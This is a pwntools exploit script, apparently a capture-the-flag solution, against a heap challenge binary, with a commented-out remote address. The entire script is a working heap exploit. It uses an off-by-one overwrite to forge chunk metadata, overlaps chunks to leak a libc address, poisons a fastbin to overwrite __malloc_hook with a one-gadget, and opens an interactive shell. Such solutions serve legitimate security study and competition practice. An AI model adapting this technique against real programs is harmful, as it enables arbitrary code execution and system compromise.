#!/usr/bin/env python
 
from pwn import *
 
p = process('./heap_61ceffec55b07104a008e18cca5df4a00ed8fad755c46cf4256eff3ba2ca18f3')
#p = remote('35.186.153.116', 7001)
 
def create(size, data):
  p.sendlineafter('>', str(1))
  p.sendlineafter('size: ', str(size))
  p.sendlineafter('data: ', data)
 
def delete(idx):
  p.sendlineafter('>', str(2))
  p.sendlineafter('idx: ', str(idx))
 
def printData(idx):
  p.sendlineafter('>', str(3))
  p.sendlineafter('idx: ', str(idx))
  p.recvuntil('data: ')
  ret = p.recvuntil('\n')
  return ret[:-1]
 
 
libc_offset    = 0x3c4b78
hook_offset    = 0x3c4aed
#oneshot_offset = 0x45216
#oneshot_offset = 0x4526a
oneshot_offset = 0xf02a4
#oneshot_offset = 0xf1147
 
 
create(0xf8, 'A'*0xf8) # chunk_AAA, idx = 0
create(0x68, 'B'*0x68) # chunk_BBB, idx = 1
create(0xf8, 'C'*0xf8) # chunk_CCC, idx = 2
create(0x10, 'D'*0x10) # chunk_DDD, idx = 3
 
# chunk_AAA will be a valid free chunk (containing libc-addresses in FD/BK)
delete(0)
 
# leverage off-by-one vuln in chunk_BBB:
# overwrite prev_inuse bit of following chunk (chunk_CCC)
delete(1)
create(0x68, 'B'*0x68) # chunk_BBB, new idx = 0
 
# set prev_size of following chunk (chunk_CCC) to 0x170
for i in range(0x66, 0x5f, -1):
  delete(0)
  create(i+2, 'B'*i + '\x70\x01') # chunk_BBB, new_idx = 0
 
# now delete chunk_CCC to trigger consolidation with the fakechunk (0x170)
# after this we have got a big free chunk (0x270) overlapping with chunk_BBB
delete(2)
 
# create a new chunk (chunk_EEE) within the big free chunk to push
# the libc-addresses (fd/bk) down to chunk_BBB
create(0xf6, 'E'*0xf6) # chunk_EEE, new_idx = 1
 
# the content of chunk_BBB now contains fd/bk (libc-addresses)
# just print the chunk (idx = 0)
libc_leak = printData(0)
libc_leak = unpack(libc_leak + (8-len(libc_leak))*'\x00', 64)
libc_base = libc_leak - libc_offset
log.info('libc_base: ' + hex(libc_base))
 
# restore the size field (0x70) of chunk_BBB
for i in range(0xfd, 0xf7, -1):
  delete(1)
  create(i+1, 'E'*i + '\x70') # chunk_EEE, new_idx = 1
 
# free chunk_BBB: the address of the chunk is added to the fastbin-list
delete(0)
# free chunk_EEE
delete(1)
 
# create another new chunk (chunk_FFF) within the big free chunk which
# will set the fd of the free'd fastbin chunk_BBB to the address of hook
hook = libc_base + hook_offset
create(0x108, 'F'*0x100 + p64(hook)) # new_idx = 0
 
# restore the size field (0x70) of the free'd chunk_BBB
for i in range(0xfe, 0xf7, -1):
  delete(0)
  create(i+8, 'F'*i + p64(0x70)) # new_idx = 0
 
# now recreate chunk_BBB
# -> this will add the address in fd (hook) to the fastbin-list
create(0x68, 'B'*0x68)
 
# the next allocation with a size equal to chunk_BBB (0x70 = fastbin)
# will return the address of hook from the fastbin-list
# --> store the address of oneshot in __malloc_hook
oneshot = libc_base + oneshot_offset
create(0x68, 0x13*'G'+p64(oneshot)+0x4d*'\x00')
 
# since __malloc_hook is set now, the next call to malloc will
# call the address stored there (oneshot)
create(0x20, 'trigger exploit')
p.interactive()